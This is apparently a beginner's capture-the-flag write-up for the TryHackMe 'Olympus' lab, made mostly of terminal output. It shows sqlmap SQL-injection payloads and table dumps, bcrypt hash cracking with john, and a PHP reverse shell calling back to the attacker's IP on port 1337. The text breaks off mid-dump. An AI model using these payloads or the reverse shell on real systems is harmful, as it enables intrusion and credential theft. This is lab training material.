# Olympus — Writeup

## Overview
### Olympus — Writeup
### Olympus — Writeup
----
My first CTF !
----
![](https://i.imgur.com/iMOlNjg.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/7d73d09352d33d65e0d972c3a17bd6af.jpeg)
### Connection
Start Machine
Hey!
Start the VM here and start enumerating! The machine can take some time to start. **Please allow up to 5 minutes** (Sorry for the inconvenience). **Bruteforcing against any login page is out of scope and should not be used**.
If you get stuck, you can find hints that will guide you on my GitHub repository (you'll find it in the walkthrough section).
Well... Happy hacking ^^
Petit Prince
Answer the questions below
Start the VM
Question Done

## Flags / Answers
- Submit your flags here.
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.96.50 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.96.50:22
Open 10.10.96.50:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.27s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.96.50 [2 ports]
Discovered open port 22/tcp on 10.10.96.50
Discovered open port 80/tcp on 10.10.96.50
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.96.50
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.96.50.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.96.50
Host is up, received user-set (0.38s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a7814042cdf25fb4ea21434800b8539 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPNeXYxrC1xv8fhFNve9CXjWSQcCXnWZThU1putOar7KBcQmoCQUYOqvmS+CDauJMPqVE3rqS0+CpTJnZn2ZWXDaCzFLZ84hjBXq8BqoWOFB0Vv0PjRKfBKC54tpA67NgLfp1TmmlS6jp4i75lxkZ6pSTOPxGUrvYvJ0iN2cAHJkgA9SZDrvT11HEp5oLmS2lXtFSoK/Q9pKNIl7y+07gZLRUeIKIn1bFRc4qrXn+rpDQR2fP9OEYiHhdJmTJJL+KjDAqZmIj0SYtuzD4Ok2Nkg5DHlCzOizYNQAkkj6Ift7dkD6LPebRp9MkAoThDzLya7YaFIP66mCbxJRPcNfQ3bJkUy0qTsu9MiiNtyvd9m8vacyA803eKIERIRj5JK1BTUKNAzsZeAuao9Kq/etHskvTy0TKspeBLwdmmRFkqerDIrznWcRyG/UnsEGUARe2h6CwuCJH8QCPMSc93zMrsZNs1z3FIoMzWTf23MWDOeNA8dkYewrDywEuOvb3Vrvk=
|   256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHFtzLQXLhGiDzPN7Al84lSfH3jFwGniFL5WQSaIjC+VGMU8mbvbGVuOij+xUAbYarbBuoUagljDmBR5WIRSDeo=
|   256 1fc1be3f9ce78e243334a644af684c3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhvoRyjZN/taS1uwwTaQ4uZrGhVUje0YWW4jg4rfdXw
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.96.50 olympus.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://olympus.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/olympus.thm/-_23-04-29_16-27-37.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-29_16-27-37.log

Target: http://olympus.thm/

[16:27:37] Starting: 
[16:27:45] 301 -  315B  - /~webmaster  ->  http://olympus.thm/~webmaster/
[16:28:14] 200 -    2KB - /index.php
[16:28:17] 301 -  315B  - /javascript  ->  http://olympus.thm/javascript/
[16:29:02] 301 -  311B  - /static  ->  http://olympus.thm/static/

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://olympus.thm/~webmaster/ --forms        
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:35:30 //

[16:35:30] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=3rjtmalc7ki...cuvu1jirtf'). Do you want to use those [Y/n] Y
[16:35:37] [INFO] searching for forms
[16:35:39] [INFO] found a total of 2 targets
[1/2] Form:
POST http://olympus.thm/~webmaster/search.php
POST data: search=&submit=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: search=&submit=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[16:35:54] [INFO] using '/home/witty/.local/share/sqlmap/output/results-04292023_0435pm.csv' as the CSV results file in multiple targets mode
[16:35:55] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:35:55] [INFO] testing if the target URL content is stable
[16:35:56] [INFO] target URL content is stable
[16:35:56] [INFO] testing if POST parameter 'search' is dynamic
[16:35:56] [WARNING] POST parameter 'search' does not appear to be dynamic
[16:35:57] [INFO] heuristic (basic) test shows that POST parameter 'search' might be injectable (possible DBMS: 'MySQL')
[16:35:57] [INFO] heuristic (XSS) test shows that POST parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[16:35:57] [INFO] testing for SQL injection on POST parameter 'search'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:36:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:36:07] [WARNING] reflective value(s) found and filtering out
[16:36:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:36:11] [INFO] testing 'Generic inline queries'
[16:36:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:36:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:36:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[16:36:40] [INFO] POST parameter 'search' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="result")
[16:36:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:36:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:36:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:36:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:36:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:36:42] [INFO] POST parameter 'search' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[16:36:42] [INFO] testing 'MySQL inline queries'
[16:36:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:36:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:36:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:36:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:36:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[16:36:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[16:36:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:36:55] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:36:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:36:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:36:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:36:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:36:57] [INFO] target URL appears to have 10 columns in query
[16:36:58] [INFO] POST parameter 'search' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[16:36:58] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if N
sqlmap identified the following injection point(s) with a total of 131 HTTP(s) requests:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=evOa' OR NOT 6056=6056#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
---
do you want to exploit this SQL injection? [Y/n] Y
[16:37:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
SQL injection vulnerability has already been detected against 'olympus.thm'. Do you want to skip further tests involving it? [Y/n] Y
[16:38:29] [INFO] skipping 'http://olympus.thm/~webmaster/includes/login.php'
[16:38:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-04292023_0435pm.csv'

[*] ending @ 16:38:29 //

or

┌──(witty㉿kali)-[/tmp]
└─$ cat req.txt 
POST /~webmaster/search.php HTTP/1.1
Host: olympus.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: http://olympus.thm
Connection: close
Referer: http://olympus.thm/~webmaster/index.php
Cookie: PHPSESSID=j8ioan6qle4ee50e49p4q73309
Upgrade-Insecure-Requests: 1

search=1337&submit=

┌──(witty㉿kali)-[/tmp]
└─$ sqlmap -r req.txt --banner
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:52:25 //

[16:52:25] [INFO] parsing HTTP request from 'req.txt'
[16:52:27] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[16:52:27] [INFO] resuming back-end DBMS 'mysql' 
[16:52:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=evOa' OR NOT 6056=6056#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
---
[16:52:28] [INFO] the back-end DBMS is MySQL
[16:52:28] [INFO] fetching banner
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.6
banner: '8.0.28-0ubuntu0.20.04.3'
[16:52:29] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 16:52:29 //

┌──(witty㉿kali)-[/tmp]
└─$ sqlmap -r req.txt --batch --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:53:15 //

[16:53:15] [INFO] parsing HTTP request from 'req.txt'
[16:53:16] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[16:53:16] [INFO] resuming back-end DBMS 'mysql' 
[16:53:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=evOa' OR NOT 6056=6056#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
---
[16:53:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[16:53:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[16:53:17] [INFO] fetching current database
[16:53:17] [INFO] fetching tables for database: 'olympus'
[16:53:18] [INFO] fetching columns for table 'flag' in database 'olympus'
[16:53:18] [INFO] fetching entries for table 'flag' in database 'olympus'
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+

[16:53:20] [INFO] table 'olympus.flag' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/flag.csv'
[16:53:20] [INFO] fetching columns for table 'categories' in database 'olympus'
[16:53:20] [INFO] fetching entries for table 'categories' in database 'olympus'
Database: olympus
Table: categories
[5 entries]
+--------+------------+
| cat_id | cat_title  |
+--------+------------+
| 1      | News       |
| 2      | Technology |
| 3      | Tutorials  |
| 7      | Business   |
| 8      | Education  |
+--------+------------+

[16:53:21] [INFO] table 'olympus.categories' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/categories.csv'
[16:53:21] [INFO] fetching columns for table 'chats' in database 'olympus'
[16:53:22] [INFO] fetching entries for table 'chats' in database 'olympus'
Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
|  | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
|  | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
|  | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

[16:53:22] [INFO] table 'olympus.chats' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/chats.csv'
[16:53:22] [INFO] fetching columns for table 'users' in database 'olympus'
[16:53:22] [INFO] fetching entries for table 'users' in database 'olympus'
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+

[16:53:23] [INFO] table 'olympus.users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/users.csv'
[16:53:23] [INFO] fetching columns for table 'comments' in database 'olympus'
[16:53:23] [INFO] fetching entries for table 'comments' in database 'olympus'
Database: olympus
Table: comments
[1 entry]
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| comment_id | comment_post_id | comment_date | comment_email | comment_author | comment_status | comment_content                                                                                                                                                           |
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1          | 2               |    | <blank>       | prometheus     | approved       | Heyyy ! You've done a damn good but unsecured job ^^\r\n\r\nI've patched a few things on my way, but I managed to hack my self into the olympus !\r\n\r\ncheerio ! \r\n=P |
+------------+-----------------+--------------+---------------+----------------+----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[16:53:23] [INFO] table 'olympus.comments' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/comments.csv'
[16:53:23] [INFO] fetching columns for table 'posts' in database 'olympus'
[16:53:23] [INFO] fetching entries for table 'posts' in database 'olympus'
Database: olympus
Table: posts
[3 entries]
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| post_id | post_category_id | post_date  | post_tags               | post_image      | post_title           | post_author | post_status | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | post_comment_count |
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| 2       | 1                | 2022-04-22 | first, post             | img.jpg         | Dear Gods and Godess | root        | publish     | <div class="wp-container-7 entry-content wp-block-post-content" style="text-align: center;">\r\n<p><strong>This is the first version of the Olympus website. It should become a platform for each and everyone of you to express their needs and desires. Humans should not be allowed to visit it.</strong></p>\r\n<p><strong>You have all been sent a username and a password (that you will need to change ASAP) that will allow you to join the Olympus and create articles.</strong></p>\r\n<p><strong>I hope you will like this website,</strong></p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>\r\n</div>[16:53:24] [WARNING] writing binary ('application/octet-stream') content to file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/post_content-42421143.bin' 
| <blank>            |
| 3       | 1                | 2022-04-27 | credentials,security,it | 61X1U2-xUTL.jpg | Credentials          | root        | publish     | <p><strong>Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.</strong></p>\r\n<p><strong>As I remind you, we have a wordlist of forbidden password that you should use. </strong></p>\r\n<p><strong>Please update your passwords.</strong></p>\r\n<p>\xa0</p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>                                                                                                                                                                                                                                                 [16:53:24] [WARNING] writing binary ('application/octet-stream') content to file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/post_content-53792449.bin' 
| <blank>            |
| 6       | 1                |  | update                  | <blank>         | Update is comming    | root        | publish     | <p style="text-align: center;"><strong>Dear gods and goddess,</strong><br /><strong>Once more, your IT god snapped his finger and here it goes :</strong><br /><strong>Olympus becomes something else, something bigger, something better.</strong><br /><strong>You will find every instruction, should you need them, here.</strong><br /><br /><strong>HOWEVER, DO NOT FORGET TO UPDATE YOUR E-MAIL ON YOUR ACCOUNT PROFILE.</strong><br /><br /><strong>root@the-it-department</strong> </p>                                                                                                                                                                   | <blank>            |
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+

[16:53:24] [INFO] table 'olympus.posts' dumped to CSV file '/home/witty/.local/share/sqlmap/output/olympus.thm/dump/olympus/posts.csv'
[16:53:24] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 16:53:24 //

┌──(witty㉿kali)-[/tmp]
└─$ tac /etc/hosts
10.10.96.50 olympus.thm chat.olympus.thm

┌──(witty㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (?)     
1g 0:00:01:32 DONE () 0.01085g/s 43.75p/s 43.75c/s 43.75C/s 19861986..pokpok
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[/tmp]
└─$ cat hash   
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C

prometheus:summertime (login chat.olympus.thm) 

upload revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?> 

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://chat.olympus.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/chat.olympus.thm/-_23-04-29_17-09-22.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-29_17-09-22.log

Target: http://chat.olympus.thm/

[17:09:23] Starting: 
[17:09:56] 302 -    0B  - /index.php  ->  login.php
[17:09:58] 301 -  325B  - /javascript  ->  http://chat.olympus.thm/javascript/
[17:10:28] 301 -  321B  - /static  ->  http://chat.olympus.thm/static/
[17:10:35] 301 -  322B  - /uploads  ->  http://chat.olympus.thm/uploads/

Task Completed

┌──(witty㉿kali)-[/tmp]
└─$ sqlmap -r req1.txt --tamper=space2comment --level 2 --risk 2  -D olympus -T chats -C file --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:39:11 //

[17:39:11] [INFO] parsing HTTP request from 'req1.txt'
[17:39:11] [INFO] loading tamper module 'space2comment'
[17:39:12] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[17:39:12] [INFO] resuming back-end DBMS 'mysql' 
[17:39:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=evOa' OR NOT 6056=6056#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
---
[17:39:13] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:39:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[17:39:13] [INFO] fetching entries of column(s) 'file' for table 'chats' in database 'olympus'
Database: olympus
Table: chats
[5 entries]
+--------------------------------------+
| file                                 |
+--------------------------------------+
